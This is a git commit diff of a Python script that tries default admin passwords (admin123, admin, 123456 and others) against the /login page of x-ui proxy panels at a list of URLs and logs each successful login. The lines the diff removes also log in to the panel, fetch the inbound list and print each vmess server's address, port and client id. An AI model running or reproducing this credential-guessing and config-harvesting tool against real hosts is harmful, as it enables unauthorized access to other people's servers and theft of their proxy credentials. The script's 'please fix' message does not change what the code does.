a10d58353c79eed5117a72af6bd5d1680ed85a1d
cpkkcb <31617622+cpkkcb@users.noreply.github.com>
2024-02-02 13:44:55 +0800

    Update xui_weak_pass.py

--- xui_weak_pass.py
+++ xui_weak_pass.py
@@ -1,10 +1,9 @@
 # -*- coding = utf-8 -*-
 # @File :xui_weak_pass.py
-import json
-from multiprocessing import Pool
 
 import requests
 import urllib3
+from multiprocessing import Pool
 
 urllib3.disable_warnings()
 
@@ -31,59 +30,30 @@ class WeakChecker:
             'https': 'https://127.0.0.1:10809'
         }
         check_url = f"{url}/login"
-        headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
+        headers = {"Sec-Ch-Ua": "\";Not A Brand\";v=\"99\", \"Chromium\";v=\"94\"",
+                   "Accept": "application/json, text/plain, */*",
+                   "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                   "X-Requested-With": "XMLHttpRequest", "Sec-Ch-Ua-Mobile": "?0",
+                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                                  "Chrome/94.0.4606.81 Safari/537.36",
+                   "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
-        # pass_test = ["admin123", "admin", '123456', "123123", "admin888"]
-        # for password in pass_test:
-        #     # 更新字典中的密码
-        data = {"username": "admin", "password": "admin"}
-        try:
-            res = requests.post(check_url, data=data, proxies=proxies, headers=headers, timeout=10)
-            self._cache.add(check_url)
-            if res.status_code == 200 and "true" in res.text:
-                headers = {
-                    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
-                                  "Chrome/94.0.4606.81 Safari/537.36",
-                    'Cookie': res.headers.get('Set-Cookie'),
-                    "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
-                check_url = f"{url}/xui/inbound/list"
-                response = requests.post(check_url, proxies=proxies, headers=headers, timeout=10)
-                response_data = response.json()
-                obj_content = response_data["obj"]
-                for item in obj_content:
-                    # 检查'protocol'键的值是否为'vmess'
-                    if item.get("protocol") == "vmess":
-                        # 获取需要的字段值，如果字段不存在则返回"none"
-                        port_value = item.get("port", "none")
-                        settings = json.loads(item["settings"])
-                        streamSettings = json.loads(item["streamSettings"])
-                        id_value = settings["clients"][0]["id"]
-                        url_without_protocol = url.split("://")[-1]
-                        # 然后去除端口号部分
-                        ip_address = url_without_protocol.split(":")[0]
-                        add_value = ip_address
-                        aid_value = item.get("aid", "0")
-                        network_value = streamSettings["network"]
-                        result = {
-                            "v": 2,
-                            "add": add_value,
-                            "port": port_value,
-                            "id": id_value,
-                            "aid": aid_value,
-                            "network": network_value
-                        }
-                        print(result)
-
-                # print(res_rule.text)
-                # with open(self._result_file, "a", encoding="utf-8") as f:
-                #     f.write(f"{url}\n")
-                #     print(f"{url} 该链接存在弱口令访问情况,请及时修复！")
-                #     f.close()
-            else:
-                print(f"{url} + ' ' + '该链接不可用'" + res.text)
-        except Exception as e:
-            print(e)
+        pass_test = ["admin123", "admin", '123456', "123123", "admin888"]
+        for password in pass_test:
+            # 更新字典中的密码
+            data = {"username": "admin", "password": password}
+            try:
+                res = requests.post(check_url, data=data, proxies=proxies, headers=headers, timeout=10)
+                self._cache.add(check_url)
+                if res.status_code == 200 and "true" in res.text:
+                    with open(self._result_file, "a", encoding="utf-8") as f:
+                        f.write(f"{url}\n")
+                        print(f"{url} 该链接存在弱口令访问情况,密码为'{password}',请及时修复！")
+                        f.close()
+                else:
+                    print(f"{url} + ' ' + '该链接不可用'" + res.text)
+            except Exception as e:
+                print(e)
 
     def check(self):
         """
